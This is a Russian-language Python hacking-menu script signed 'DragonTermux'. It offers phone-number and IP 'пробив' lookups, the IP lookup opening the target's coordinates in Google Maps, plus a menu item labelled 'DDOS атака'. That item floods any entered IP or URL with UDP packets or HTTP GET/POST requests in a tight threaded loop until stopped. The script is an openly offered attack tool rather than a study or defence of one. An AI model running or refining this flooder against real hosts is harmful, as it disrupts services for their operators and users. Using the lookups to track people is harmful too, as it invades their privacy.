import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import requests
import webbrowser
import socket
import threading
import time

# Цвета для текста
red = "\033[31m"
purple = "\033[35m"
yellow = "\033[33m"
reset = "\033[0m"

# Переменные для отправки запросов
stop_sending = False

def main_menu():
    print(f"{red}╔══╗─╔═══╗╔══╗╔═══╗╔══╗╔╗─╔╗")
    print(f"║╔╗╚╗║╔═╗║║╔╗║║╔══╝║╔╗║║╚═╝║")
    print(f"║║╚╗║║╚═╝║║╚╝║║║╔═╗║║║║║╔╗─║")
    print(f"║║─║║║╔╗╔╝║╔╗║║║╚╗║║║║║║║╚╗║")
    print(f"║╚═╝║║║║║─║║║║║╚═╝║║╚╝║║║─║║")
    print(f"╚═══╝╚╝╚╝─╚╝╚╝╚═══╝╚══╝╚╝─╚╝")
    print(f"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print(f"       By DragonTermux")
    print(f"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print(f"[1] Пробив по номеру телефона")
    print(f"[2] Пробив по IP")
    print(f"[3] DDOS атака")
    print(f"[4] Выйти из меню{reset}")
    print()
    choice = input(f"{purple}[#]{yellow}Введите цифру: {reset}")
    return choice

def check_number_info(phone_number):
    try:
        parsed_number = phonenumbers.parse(phone_number)
        if not phonenumbers.is_valid_number(parsed_number):
            return "❌ Неверный или невалидный номер телефона."
        country = geocoder.country_name_for_number(parsed_number, "ru")
        region = geocoder.description_for_number(parsed_number, "ru")
        operator = carrier.name_for_number(parsed_number, "ru")
        timezones = timezone.time_zones_for_number(parsed_number)

        return (f"📱Номер: {phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}\n"
                f"🗺️Страна: {country}\n"
                f"🏙️Регион: {region}\n"
                f"📶Оператор: {operator}\n"
                f"⏰Часовой пояс: {', '.join(timezones)}")
    except phonenumbers.phonenumberutil.NumberParseException:
        return "❌ Ошибка при разборе номера. Проверьте правильность введённого номера."

def get_ip_info(ip_address):
    url = f"https://ipwho.is/{ip_address}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        if data['success']:
            latitude = data['latitude']
            longitude = data['longitude']
            result = (f"📡IP: {data['ip']}\n"
                      f"🔌Тип IP: {data['type']}\n"
                      f"🗺️Страна: {data['country']}\n"
                      f"🛣️Регион: {data['region']}\n"
                      f"🏙️Город: {data['city']}\n"
                      f"🌍Широта: {latitude}\n"
                      f"🌎Долгота: {longitude}\n"
                      f"⏰Часовой пояс: {data['timezone']['id']} (Текущее время: {data['timezone']['current_time']})\n"
                      f"🏢Организация: {data['connection']['org']}\n"
                      f"📃ISP: {data['connection']['isp']}")
            open_map = input("Хотите открыть местоположение в Google Картах (Да/Нет)? ").strip().lower()
            if open_map == "да":
                google_maps_url = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"
                webbrowser.open(google_maps_url)
                print(f"Открываем Google Карты: {google_maps_url}")
            else:
                print("Возвращаемся в меню...")
            return result
        else:
            return "❌ Не удалось получить данные по IP-адресу."
    else:
        return "❌ Ошибка при запросе данных по IP-адресу."

def phone_lookup():
    phone = input(f"{purple}[#]{yellow}Введите номер телефона (в формате +7XXXXXXXXXX): {reset}")
    print(f"{red}Ищем информацию...{reset}")
    info = check_number_info(phone)
    print(info)

def ip_lookup():
    ip = input(f"{purple}[#]{yellow}Введите IP-адрес: {reset}")
    print(f"{red}Ищем информацию...{reset}")
    info = get_ip_info(ip)
    print(info)

def send_requests(request_type, url):
    global stop_sending
    while not stop_sending:
        try:
            if request_type == "1":  # UDP
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"Test UDP Packet", (url, 80))
            elif request_type == "2":  # HTTP POST
                requests.post(url, data={"key": "value"})
            elif request_type == "3":  # HTTP GET
                requests.get(url)
            print(f"{red}Запрос отправлен на {url}{reset}")
        except Exception as e:
            print(f"Ошибка: {e}")
        # Установите задержку, если это необходимо, или уберите ее
        time.sleep(0.01)  # Задержка в 10 миллисекунд

def request_sender():
    global stop_sending
    request_type = input(f"{purple}[#]{yellow}Выберите вид запроса: [1]UDP, [2]HTTP POST, [3]HTTP GET: {reset}")
    
    if request_type == "1":  # UDP
        ip_address = input(f"{purple}[#]{yellow}Введите IP-адрес: {reset}")
    else:  # HTTP запросы
        url = input(f"{purple}[#]{yellow}Введите ссылку на сайт: {reset}")

    print(f"{red}Отправка запросов... Нажмите Enter для остановки...{reset}")
    stop_sending = False
    
    if request_type == "1":
        thread = threading.Thread(target=send_requests, args=(request_type, ip_address))
    else:
        thread = threading.Thread(target=send_requests, args=(request_type, url))
    
    thread.start()
    input()  # Ожидаем ввода Enter для остановки
    stop_sending = True
    print("Запросы остановлены. Возвращаемся в меню...")

def exit_program():
    print("Выход из программы.")
    exit()

# Основной цикл программы
while True:
    user_choice = main_menu()

    if user_choice == "1":
        phone_lookup()
    elif user_choice == "2":
        ip_lookup()
    elif user_choice == "3":
        request_sender()
    elif user_choice == "4":
        exit_program()
    else:
        print("Неверный ввод, попробуйте снова.\n")
